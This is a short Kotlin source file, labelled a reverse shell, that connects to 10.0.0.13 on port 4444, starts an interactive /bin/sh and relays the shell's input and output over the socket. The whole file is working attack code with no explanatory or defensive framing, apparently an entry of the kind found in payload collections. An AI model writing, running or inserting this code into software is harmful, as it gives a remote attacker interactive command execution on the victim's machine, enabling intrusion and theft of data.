// Kotlin reverse shell
import java.net.Socket

fun main() {
    val s = Socket("10.0.0.13", 4444)
    val p = ProcessBuilder("/bin/sh", "-i")
        .redirectErrorStream(true)
        .start()
    Thread { s.getInputStream().copyTo(p.outputStream); p.outputStream.flush() }.start()
    Thread { p.inputStream.copyTo(s.getOutputStream()) }.start()
    p.waitFor()
    s.close()
}
